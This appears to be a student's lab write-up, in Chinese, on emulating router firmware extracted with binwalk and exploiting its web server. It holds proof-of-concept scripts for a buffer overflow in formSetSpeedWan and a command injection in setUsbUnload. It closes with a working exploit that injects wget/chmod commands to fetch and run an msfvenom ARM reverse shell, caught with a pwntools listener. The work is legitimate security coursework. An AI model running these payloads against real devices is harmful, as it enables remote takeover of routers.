Binwalk 是一个基于 Python 编写的命令行工具，主要用于分析和提取固件镜像中的文件系统和文件，它支持多种固件格式，并且能够自动识别并处理这些格式，使得用户无需关心底层细节即可轻松完成固件的逆向分析工作，Binwalk 的主要功能包括：

**固件扫描**：自动检测固件镜像类型，识别并列出所有已知的固件签名。

**文件提取**：从固件镜像中提取文件系统或单个文件，支持多种压缩算法和编码方式。

**递归扫描**：对于嵌套的固件镜像，Binwalk 可以递归地进行扫描和提取，确保无遗漏。

**脚本支持**：通过 Python 脚本扩展功能，用户可以自定义扫描规则或处理逻辑。

**使用**：

```bash
binwalk [OPTIONS] [FILE_NAME]

Options:
  -L, --list                   List supported signatures and extractors
  -q, --quiet                  Supress output to stdout
  -v, --verbose                During recursive extraction display *all* results
  -e, --extract                Automatically extract known file types
  -M, --matryoshka             Recursively scan extracted files
  -a, --search-all             Search for all signatures at all offsets
  -E, --entropy                Plot the entropy of the specified file
  -l, --log <LOG>              Log JSON results to a file
  -t, --threads <THREADS>      Manually specify the number of threads to use
  -x, --exclude <EXCLUDE>...   Do no scan for these signatures
  -y, --include <INCLUDE>...   Only scan for these signatures
  -C, --directory <DIRECTORY>  Extract files/folders to a custom directory [default: extractions]
  -h, --help                   Print help
  -V, --version                Print version
```



```bash
binwalk -Me ./task/firmware.bin
```

运行结果：

<img src="C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250512091427176.png" alt="image-20250512091427176" style="zoom:50%;" />

![image-20250512091432008](C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250512091432008.png)

![image-20250512091435925](C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250512091435925.png)

使用 Linux 操作系统，版本为 2.6.36.4brcmarm



![image-20250512091439367](C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250512091439367.png)

使用 SquashFS 文件系统(高度压缩的只读文件系统)

创建时间：2017-05-10 14:10:50



![image-20250512091445343](C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250512091445343.png)

![image-20250512091500918](C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250512091500918.png)

![image-20250512091506398](C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250512091506398.png)



先静态分析一下代码 __formSetSpeedWan，setUsbUnload__

<img src="C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250512093841238.png" alt="image-20250512093841238" style="zoom: 37%;" />

有三个参数：speed_dir    ucloud_enable    password



被调用时机：
<img src="C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250512093910868.png" alt="image-20250512093910868" style="zoom:67%;" />



<img src="C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250512094555786.png" alt="image-20250512094555786" style="zoom:67%;" />

有一个参数：deviceName

被调用时机：

<img src="C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250512094526024.png" alt="image-20250512094526024" style="zoom:67%;" />





可以猜测这些字符串是匹配 URL 路径的，访问对于 URL 调用后面的函数处理

`/formSetSpeedWan?arg=...`

`/setUsbUnload?arg=...`





formSetSpeedWan

<img src="C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250512101214118.png" alt="image-20250512101214118" style="zoom:67%;" />

这个变量通过`speed_dir` 传入

将 speed_dir 字段构造得很长，使得sprintf缓冲区写入溢出

如`http://0.0.0.0:80/goForm/SetSpeedWan?speed_dir=1xxxxx......xxxxx`





<img src="C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250512103639428.png" alt="image-20250512103639428" style="zoom:67%;" />

deviceName 变量传入

在正常字段deviceName=xxxx后利用分号注入命令

如`http://0.0.0.0:80/goForm/setUsbUnload?deviceName=name;cmd`

cmd指注入的命令





```sh
# 添加执行权限
chmod u+x extractions/firmware.bin.extracted/0/.bin.extracted/0/partition_1.bin.extracted/0/squashfs-root/bin/httpd
chmod u+x /home/pore/pore25/pore_23307130238/Lab10/task/run_x86.sh
```


```sh
# 运行脚本进行固件模拟
sudo /home/pore/pore25/pore_23307130238/Lab10/task/run_x86.sh  /home/pore/pore25/pore_23307130238/Lab9/extractions/firmware.bin.extracted/0/.bin.extracted/0/partition_1.bin.extracted/0/squashfs-root
```

利用运行脚本完成对固件文件系统中`/bin/httpd`的模拟，并回答如下问题：

* `task`目录下运行脚本中`# [HACK1 begin]`和`# [HACK1 end]`间的脚本对于成功模拟固件的作用是什么？(5分)

```sh
# [HACK1 begin]
tunctl -t br0 -u `whoami`
ifconfig br0 192.168.0.4/24
# [HACK1 end]
```

```
网络环境准备：创建一个虚拟网络接口，IP设置为192.168.0.4
```

* `task`目录下运行脚本中`# [HACK2 begin]`和`# [HACK2 end]`间的脚本对于成功模拟固件的作用是什么？请你结合对固件的逆向进行说明。(5分)

```sh
# [HACK2 begin]
printf '\x01\x30\xa0\xe3' | dd of=$1/bin/httpd bs=1 count=4 seek=156992 conv=notrunc
printf '\x01\x30\xa0\xe3' | dd of=$1/bin/httpd bs=1 count=4 seek=157028 conv=notrunc
# [HACK2 end]
```

![image-20250520011058877](C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250520011058877.png)

```
修改指令，绕过在模拟环境下无法通过的判断：
调用check_network的返回值r0复制给r3，r3需要小于等于0，否则将一直调用sleep，将cpy r3,r0修改为mov r3,1（'\x01\x30\xa0\xe3'）
计算这条指令的位置：0x2e540 - 0x08000 = 0x26540 = 156992字节 使用dd命令修改

同理ConnectCfm的返回值需要为0，同样将cpy r3,r0指令修改为mov r3,1（'\x01\x30\xa0\xe3'）
修改位置：0x2e564 - 0x08000 = 0x26564 = 157028字节
```

![image-20250520012040838](C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250520012040838.png)



* 展示成功模拟后的控制台输出。(5分)

<img src="C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250513211247598.png" style="zoom:50%;" />

<img src="C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250513211303727.png" alt="image-20250513211303727" style="zoom:50%;" />

* 展示使用`curl`获取的网络服务首页的html页面文本。(5分)

```sh
curl http://192.168.0.4:80/index.html
```

<img src="C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250513211753037.png" alt="image-20250513211753037" style="zoom:50%;" />





**1.** 我的**task.txt**文件希望我分析的函数名称为__formSetSpeedWan__。

**2.** **回答如下问题：**

(1) 你用来触发缓冲区溢出的攻击载荷。(10分)

```
speed_dir = "aaaa....aaaa"
```

(2) 你的PoC脚本。（10分）

```python
import requests

ip = '192.168.0.4'
url = f'http://{ip}/goform/SetSpeedWan'
payload = {'speed_dir': 'a'*1000}

r = requests.post(url=url,data=payload)
r = requests.post(url=url,data=payload)

print(r.content)
```

(3) 成功触发缓冲区溢出后，你观察到的异常程序行为。(10分)

固件输出：

![image-20250513212451536](C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250513212451536.png)

Poc输出：

![image-20250513212514878](C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250513212514878.png)





## **【实验任务3】命令注入漏洞PoC编写（30分）**

**1.** **我的task.txt**文件希望我分析的函数名称为**_formsetUsbUnload**__。

**2.** **回答如下问题：**

(1) 你用来触发命令注入的攻击载荷。(10分)

```
deviceName:;ls
```

(2) 你的PoC脚本。（10分）

```python
import requests
from pwn import*

ip = "192.168.0.4"
url = "http://" + ip + "/goform/setUsbUnload"
payload = ";ls"
data = {"deviceName":payload}

r = requests.post(url=url,data=data)
r = requests.post(url=url,data=data)
print(r.text)
```

(3) 成功触发命令注入后，你观察到的异常程序行为。(10分)

![image-20250513213111319](C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250513213111319.png)

![image-20250513213434161](C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250513213434161.png)



## **【实验任务4】命令注入漏洞利用（20分）**

**1.** 我的**task.txt**文件希望我分析的函数名称为____**formsetUsbUnload**____。

**2.** **回答如下问题：**

利用**metasploit-framework**生成反向连接192.168.0.4 的1234端口的能够反弹shell的恶意程序

```sh
msfvenom -p linux/armle/shell_reverse_tcp LHOST=192.168.0.4 LPORT=1234 -f elf -o msf-arm
```

![image-20250513214332249](C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250513214332249.png)

启动Python HTTP服务器，监听端口号为8000，根目录为当前目录

```sh
python3 -m http.server 8000 -d `pwd`
```

执行Exp

(1) 你成功进行反弹shell攻击的截图。（10分）

固件：

![image-20250513222244761](C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250513222244761.png)

监听程序：

![image-20250513222257682](C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250513222257682.png)

服务器：

![image-20250513222320872](C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250513222320872.png)

远程shell执行ls，输出如下：

![image-20250513222337088](C:/Users/33135/AppData/Roaming/Typora/typora-user-images/image-20250513222337088.png)

(2) 你编写的Exp源代码，并对你的代码的功能进行简要的解释。(10分)

```python
from pwn import *
import requests
from threading import Thread

#构造注入的命令
cmd = 'wget http://0.0.0.0:8000/msf-arm -O /msf;'  #从我们创建的服务器下载msf文件
cmd += 'chmod 777 /msf;'   #添加执行权限
cmd += '/msf' 			   #执行反弹shell的二进制程序

ip = "192.168.0.4"

url = "http://" + ip + "/goform/setUsbUnload"  

payload = ";" + cmd  # 注入命令

data = {"deviceName":payload}

def attack():
    r = requests.post(url=url,data=data) 

thread = Thread(target=attack) #创建线程进行攻击
thread.start()

io = listen(1234)  #主进程进行监听1234端口，固件将连接到我们的1234端口
io.wait_for_connection()
io.interactive() #监听收到连接后进入交互模式
```



## **实验分析与总结**

本次实验完成了固件模拟与漏洞验证（缓冲区溢出漏洞，命令行注入漏洞），较简单。

了解了二进制漏洞利用的原理。